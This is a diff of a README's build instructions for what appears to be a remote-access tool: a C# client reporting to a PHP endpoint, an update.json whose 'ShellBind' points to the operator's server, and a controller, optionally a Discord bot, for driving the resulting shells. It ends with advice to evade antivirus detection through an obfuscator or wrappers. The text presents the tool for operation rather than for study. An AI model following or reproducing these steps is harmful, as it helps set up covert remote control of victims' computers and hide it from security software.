@@ -30,12 +30,14 @@ Explore the source code 👇🏻
 - At least 3 braincells
 ### Building
 1. First you need a webserver upload [TellMe.php](Server/TellMe.php) there, copy the link
-2. Change the API endpoint at [Server.cs](Client/Communication/Server.cs) pointing to [TellMe.php](Server/TellMe.php) on **your** server, put the link here
+1. Configure ```update.json```, [more info here](Server/), don't forget to change ShellBind to your own server
+1. Set up [the Controller](Controller/)
+1. Change the API endpoint at [Server.cs](Client/Communication/Server.cs) pointing to [TellMe.php](Server/TellMe.php) on **your** server, put the link here
 <p align="center">
  <img src="Repo/Images/0.png"/>
-</p>
+</p> 
 
-4. **(Optional)** Set up a Discord bot if you want the controller to work on Dicord, else you can just controll it via commandline, more info [here!](Controller/README.md)
+4. **(Optional)** Set up a Discord bot if you want the controller to work on Dicord, else you can just control the shells via console, more info [here!](Controller/README.md)
 5. Compile on Release, not on Debug
 6. Star the repo (important 😉)
 7. **(Optional)** Got detected by AV? Use [an obfuscator](https://github.com/mkaring/ConfuserEx) or better yet, use wrappers
